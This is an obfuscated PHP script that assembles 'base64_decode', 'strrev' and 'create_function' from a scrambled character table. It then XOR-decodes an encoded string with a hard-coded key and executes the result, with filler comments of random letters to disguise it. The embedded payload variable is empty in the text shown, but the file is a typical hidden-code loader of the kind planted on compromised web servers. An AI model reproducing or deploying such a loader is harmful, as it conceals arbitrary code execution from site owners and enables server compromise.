<?php  


 function ajUdR($YLfM6, $Btygl = '') { $UbTd2 = $YLfM6; $gupTD = ''; for ($h3Xq1 = 0; $h3Xq1 < strlen($UbTd2);) { for ($hRqtW = 0; $hRqtW < strlen($Btygl) && $h3Xq1 < strlen($UbTd2); $hRqtW++, $h3Xq1++) { $gupTD .= $UbTd2[$h3Xq1] ^ $Btygl[$hRqtW]; } } return $gupTD; }
/*UIJowGEXHMayGnPPWUouJSrnzSoRvfXedsLzBPvbvitiPJySobaDYySowKrxOXqeFWgFZSGZCyhLsXAOacfFGYMjNwOYBIcXBuVDRPkRdHnjpfWEgWDAHsaXxcEsHniJ*/

$GQcHyOMg8282 = "4wzm6i2;r9af8e/pyxb5q0cd3h(nulsj_1*votk)7.g";
$tcHOqpKW3558 = "";
$sotJDPjb2696 = "";
$nYFpgRGa8589 = "";
foreach([18,10,30,13,4,0,32,23,13,22,36,23,13] as $Q){
   $sotJDPjb2696 .= $GQcHyOMg8282[$Q];
}
foreach([30,37,8,8,13,35] as $Q){
   $nYFpgRGa8589 .= $GQcHyOMg8282[$Q];
}

/*QLdwcFiCXJNzFhMnFKvpcFIFBBOFhMIpyVFhHpzgkFHJocVQxrHYQLJgYUsMadAPBZANFSkERuUNrQymJSmAYLdAPgpMnpNiWXPlWpoVSdBKOzuComkVzERPZmFGTutu*/

$Q = $nYFpgRGa8589('n'.'o'.'i'.''.''.'t'.''.''.''.''.'c'.''.''.'n'.''.''.'u'.'f'.''.''.''.'_'.'e'.'t'.''.''.'a'.''.''.''.'e'.'r'.'c'.''.'');
$h = $Q("/*NcJznTHP3363*/", $sotJDPjb2696( ajUdR($sotJDPjb2696($tcHOqpKW3558), "vdwIAJoh7701")));
$h();

/*LOyEHFMgmGBBEaJLnACkurYWDlptTssAUyzPMPDlZbVlNvsOGHotJYzXAdsamkLAwcVVkSOjgrIOqKvKsItvryuSRQPBZVxtsAJTcPsaHAOlnSRAxDSqsRIGCvGVfADf*/